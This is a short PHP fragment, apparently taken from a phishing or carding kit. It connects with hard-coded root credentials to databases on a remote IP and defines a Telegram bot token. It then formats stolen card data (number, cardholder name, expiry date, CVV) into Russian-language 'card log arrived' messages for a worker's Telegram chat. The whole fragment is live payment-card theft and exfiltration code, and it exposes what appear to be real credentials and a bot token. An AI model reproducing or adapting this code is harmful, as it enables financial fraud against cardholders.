...
$dbconn = pg_connect("host=46.148.239.101 port=6432 dbname=support_infos user=root password=root");
$userconn = pg_connect("host=46.148.239.101 port=6432 dbname=user_infos user=root password=root");
...
$botToken = "6174901511:AAHmo-uKeJwyb1KRWVcHehmpjR6_OEXgmqM";
$chatID = $row['workerID'];
...
$messageToBot .= '🃏Пришёл лог карты <b>' . $bank_name . '</b>' . PHP_EOL;
$messageToBot .= '♣️Номер: <code>' . $cardNumber . '</code>' . PHP_EOL;
$messageToBot .= '♣️Имя на карте: <code>' . $cardName . '</code>' . PHP_EOL;
$messageToBot .= '♣️Дата: <code>' . $cardMonth . '/' . $cardYear . '</code>' . PHP_EOL;
$messageToBot .= '♣️CVV: <code>' . $cardCVV . '</code>' . PHP_EOL;
...
$messageToBot = '<b>' . $currService . '</b>'. PHP_EOL;
$messageToBot .= '🃏Пришёл лог карты' . PHP_EOL;
